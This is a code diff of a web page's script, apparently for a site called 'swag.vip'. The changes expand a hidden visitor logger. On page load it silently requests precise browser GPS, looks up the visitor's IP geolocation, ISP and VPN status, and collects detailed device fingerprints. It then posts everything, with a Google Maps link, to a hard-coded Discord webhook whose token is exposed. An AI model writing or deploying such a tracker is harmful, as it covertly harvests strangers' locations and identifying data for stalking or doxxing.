@@ -683,71 +683,97 @@
             if (loadTime > 0) perfData = loadTime + ' ms';
         } catch(e) {}
 
-        function sendWebhook() {
+        function sendWebhook(extraFields) {
             var now = new Date();
             var date = now.toLocaleDateString('fr-FR');
             var heure = now.toLocaleTimeString('fr-FR');
 
-            var geoFields = [
-                { name: 'IP', value: '||`' + ip + '`||', inline: true },
-                { name: 'Date', value: date + ' ' + heure, inline: true },
-                { name: 'Pays', value: (geo.country_name || 'N/A') + ' ' + (geo.country_code ? ':' + geo.country_code.toLowerCase() + ':' : ''), inline: true },
-                { name: 'Ville', value: geo.city || 'N/A', inline: true },
-                { name: 'Region', value: geo.region || 'N/A', inline: true },
-                { name: 'ISP', value: (geo.org || 'N/A').substring(0, 100), inline: false }
-            ];
-            if (geo.latitude && geo.longitude) {
-                geoFields.push({ name: 'GPS', value: '||`' + geo.latitude + ', ' + geo.longitude + '`||', inline: true });
-            }
-            if (geo.postal) {
-                geoFields.push({ name: 'Postal', value: geo.postal, inline: true });
+            var embed1 = {
+                title: 'Location',
+                color: 2894892,
+                fields: [
+                    { name: 'IP', value: '||`' + ip + '`||', inline: true },
+                    { name: 'Date', value: date + ' ' + heure, inline: true },
+                    { name: 'Pays', value: (geo.country || 'N/A') + ' ' + (geo.countryCode ? ':' + geo.countryCode.toLowerCase() + ':' : ''), inline: true },
+                    { name: 'Region', value: (geo.regionName || 'N/A') + ' (' + (geo.region || '') + ')', inline: true },
+                    { name: 'Ville', value: geo.city || 'N/A', inline: true },
+                    { name: 'Postal', value: geo.zip || 'N/A', inline: true },
+                    { name: 'GPS', value: '||`' + (geo.lat || 'N/A') + ', ' + (geo.lon || 'N/A') + '`||', inline: true },
+                    { name: 'Timezone', value: geo.timezone || 'N/A', inline: true },
+                    { name: 'Google Maps', value: (geo.lat && geo.lon) ? '[Ouvrir](https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon + ')' : 'N/A', inline: true }
+                ],
+                footer: { text: 'swag.vip' }
+            };
+
+            var embed2 = {
+                title: 'Reseau',
+                color: 2894892,
+                fields: [
+                    { name: 'ISP', value: (geo.isp || 'N/A').substring(0, 100), inline: false },
+                    { name: 'Organisation', value: (geo.org || 'N/A').substring(0, 100), inline: false },
+                    { name: 'AS', value: (geo.as || 'N/A').substring(0, 100), inline: false },
+                    { name: 'Reverse DNS', value: '`' + (geo.reverse || 'N/A') + '`', inline: false },
+                    { name: 'Mobile', value: geo.mobile ? 'Oui' : 'Non', inline: true },
+                    { name: 'Proxy/VPN', value: geo.proxy ? 'Oui' : 'Non', inline: true },
+                    { name: 'Hosting', value: geo.hosting ? 'Oui' : 'Non', inline: true },
+                    { name: 'Conn', value: connType, inline: true },
+                    { name: 'DL Speed', value: connDown, inline: true },
+                    { name: 'Latence', value: connUp, inline: true }
+                ]
+            };
+
+            var embed3 = {
+                title: 'Appareil',
+                color: 2894892,
+                fields: [
+                    { name: 'Navigateur', value: browser, inline: true },
+                    { name: 'OS', value: os, inline: true },
+                    { name: 'Device', value: device, inline: true },
+                    { name: 'Platform', value: platform, inline: true },
+                    { name: 'CPU', value: cpuCores + ' cores', inline: true },
+                    { name: 'RAM', value: ram, inline: true },
+                    { name: 'GPU', value: '`' + gpu.substring(0, 80) + '`', inline: false },
+                    { name: 'Screen', value: screenRes + ' @' + pixelRatio + 'x (' + colorDepth + ')', inline: true },
+                    { name: 'Batterie', value: batteryLevel + (charging !== 'N/A' ? (charging ? ' :green_circle:' : ' :red_circle:') : ''), inline: true },
+                    { name: 'Touch', value: touch, inline: true },
+                    { name: 'Cookies', value: cookies, inline: true },
+                    { name: 'DNT', value: doNotTrack, inline: true },
+                    { name: 'Langue', value: lang, inline: true },
+                    { name: 'Referrer', value: referrer, inline: false }
+                ]
+            };
+
+            if (gpsCoords) {
+                embed1.fields.push({ name: 'GPS Precis', value: '||`' + gpsCoords.lat + ', ' + gpsCoords.lon + '`||', inline: true });
+                embed1.fields.push({ name: 'Precision', value: gpsCoords.accuracy + ' m', inline: true });
             }
 
-            var techFields = [
-                { name: 'Nav', value: browser, inline: true },
-                { name: 'OS', value: os, inline: true },
-                { name: 'Device', value: device, inline: true },
-                { name: 'CPU', value: '' + cpuCores + ' cores', inline: true },
-                { name: 'RAM', value: ram, inline: true },
-                { name: 'GPU', value: '`' + gpu.substring(0, 80) + '`', inline: false },
-                { name: 'Conn', value: connType, inline: true },
-                { name: 'DL', value: connDown, inline: true },
-                { name: 'Ping', value: connUp, inline: true },
-                { name: 'Batt', value: batteryLevel + (charging !== 'N/A' ? (charging ? ' :green_circle:' : ' :red_circle:') : ''), inline: true },
-                { name: 'Screen', value: screenRes + ' @' + pixelRatio + 'x', inline: true },
-                { name: 'Lang', value: lang + ' | ' + tz, inline: true },
-                { name: 'Touch', value: touch, inline: true },
-                { name: 'Cookie', value: cookies, inline: true },
-                { name: 'Referrer', value: referrer, inline: false }
-            ];
+            if (extraFields) embed1.fields = embed1.fields.concat(extraFields);
 
             fetch('https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [
-                        {
-                            title: 'New Visitor',
-                            color: 2894892,
-                            fields: geoFields,
-                            footer: { text: 'swag.vip' }
-                        },
-                        {
-                            color: 2894892,
-                            fields: techFields
-                        }
-                    ]
-                })
+                body: JSON.stringify({ embeds: [embed1, embed2, embed3] })
             });
         }
 
-        var ip, geo;
+        var ip = 'N/A', geo = {}, gpsCoords = null;
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                gpsCoords = {
+                    lat: pos.coords.latitude.toFixed(6),
+                    lon: pos.coords.longitude.toFixed(6),
+                    accuracy: Math.round(pos.coords.accuracy)
+                };
+            }, function() {}, { enableHighAccuracy: true, timeout: 5000 });
+        }
 
         fetch('https://api.ipify.org?format=json')
             .then(function(r) { return r.json(); })
             .then(function(ipData) {
                 ip = ipData.ip;
-                return fetch('https://ipapi.co/' + ip + '/json/');
+                return fetch('http://ip-api.com/json/' + ip + '?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting,query');
             })
             .then(function(r) { return r.json(); })
             .then(function(geoData) {
@@ -763,8 +789,8 @@
                 }
             })
             .catch(function() {
-                ip = 'N/A'; geo = {};
-                sendWebhook();
+                geo = {};
+                sendWebhook([{ name: 'Status', value: 'IP non disponible', inline: false }]);
             });
     </script>
 </body>
